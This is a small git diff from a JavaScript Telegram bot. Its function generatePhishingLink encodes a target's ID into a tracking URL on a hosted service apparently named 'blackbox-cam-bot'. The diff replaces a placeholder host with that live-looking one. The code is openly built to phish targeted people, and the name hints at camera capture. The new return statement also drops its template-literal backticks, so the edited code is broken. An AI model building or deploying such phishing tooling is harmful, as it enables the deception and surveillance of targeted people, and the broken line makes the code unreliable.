@@ -21,8 +21,8 @@ const sessions = new Map();
 
 function generatePhishingLink(targetId) {
     const token = Buffer.from(targetId.toString()).toString('base64');
-    const baseUrl = process.env.RENDER_EXTERNAL_URL || 'https://ваш-сервис.onrender.com';
-    return `${baseUrl}?target=${token}`;
+    const baseUrl = process.env.RENDER_EXTERNAL_URL || 'https://blackbox-cam-bot.onrender.com';
+    return ${baseUrl}?target=${token};
 }
 
 bot.start((ctx) => {
